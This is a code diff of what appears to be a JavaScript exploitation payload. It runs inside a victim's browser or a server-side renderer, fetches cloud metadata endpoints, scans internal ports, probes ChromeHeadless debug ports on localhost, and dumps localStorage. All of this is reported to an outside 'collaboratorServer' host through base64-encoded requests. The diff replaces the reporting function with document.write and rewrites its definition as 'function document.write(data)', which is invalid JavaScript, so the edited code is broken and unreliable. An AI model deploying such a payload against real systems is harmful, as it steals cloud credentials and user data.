@@ -28,7 +28,7 @@ var communPorts = [80, 81, 300, 443, 591, 593, 832, 981, 1010, 1311, 2082, 2087,
 
 function cloudMetadata(metadataServer, matadataPaths, headers){
     for (const [key, value] of Object.entries(matadataPaths)) {
-        log(key + makeRequest("http://" + metadataServer + value, "GET", headers));
+        document.write(key + makeRequest("http://" + metadataServer + value, "GET", headers));
     }
 }
 
@@ -37,7 +37,7 @@ function checkPort(scheme, ip, port){
     var baseUrl = scheme + ip + ":" + port.toString();
 
     img.onload = function () {
-        log("Open port: " + baseUrl);
+        document.write("Open port: " + baseUrl);
     };
 
     img.src = baseUrl + "/favicon.ico";
@@ -83,12 +83,12 @@ function getBrowserInfo(){
 			
 	}
 
-    log("Browser Info: " + allInfo);
+    document.write("Browser Info: " + allInfo);
 }
 
 function chromeHeadless(){
-    log("ChromeHeadless remote-debug, port 9222: " + makeRequest("http://127.0.0.1:9222", "GET", {}));
-    log("ChromeHeadless remote-debug, port 3389: " + makeRequest("http://127.0.0.1:3389", "GET", {}));
+    document.write("ChromeHeadless remote-debug, port 9222: " + makeRequest("http://127.0.0.1:9222", "GET", {}));
+    document.write("ChromeHeadless remote-debug, port 3389: " + makeRequest("http://127.0.0.1:3389", "GET", {}));
 }
 
 function localStorageLeak(){
@@ -99,12 +99,12 @@ function localStorageLeak(){
 		            if(i>0) { output += "&"; }
 		            output += encodeURIComponent(localStorage.key(i)) + '=' + encodeURIComponent(localStorage.getItem(localStorage.key(i)));
 		    }
-		    log("LocalStorageLeak: " + output);
+		    document.write("LocalStorageLeak: " + output);
 		}
 	}
 }
 
-function log(data) {
+function document.write(data) {
     makeRequest("http://" + collaboratorServer + "/log?msg=" + btoa(data), "GET", {});
 }
 
@@ -123,13 +123,13 @@ function makeRequest(url, method, headers) {
         else
             return "Request failed, status-code: " + req.status.toString();
     } catch(err) {
-        //log("Request error: " + err.toString());
+        document.write("Request error: " + err.toString());
     }
     return null;
 }
 
 //Log Javascript enabled and triggered
-log('Triggered in ' + window.location.href);
+document.write('Triggered in ' + window.location.href);
 
 //Browser Storage Leak
 localStorageLeak();
